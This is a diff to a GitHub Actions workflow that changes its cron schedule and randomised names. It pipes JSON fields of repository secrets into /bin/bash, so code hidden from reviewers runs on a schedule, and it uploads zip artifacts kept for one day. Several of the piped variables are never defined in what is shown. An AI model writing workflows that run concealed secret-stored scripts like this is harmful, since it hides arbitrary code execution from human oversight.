@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '3 4,10,16,22 * * *'
+    - cron: '26 3,9,15,21 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,15 +11,16 @@ jobs:
       - uses: actions/checkout@v4
       - name: sessionweb888
         env:
-          qppz5: ${{ secrets.qppz5 }}
+          blzs23200: ${{ secrets.blzs23200 }}
         run: |
-          printf '%s' "$qppz5" | jq -r .ixww519 | /bin/bash
-          printf '%s' "$deoke1598" | jq -r .rxdko8 | /bin/bash
-          printf '%s' "$ybfm934" | jq -r .hwop22 | /bin/bash
+          printf '%s' "$blzs23200" | jq -r .cduyk90 | /bin/bash
+          printf '%s' "$xl7511" | jq -r .rvpbb8 | /bin/bash
+          printf '%s' "$m62" | jq -r .kq89386 | /bin/bash
+          printf '%s' "$ay59463" | jq -r .ur41267 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
         with:
-          name: q7OsJ5Xm
+          name: MP5qUNlW
           path: "*.zip"
           retention-days: 1
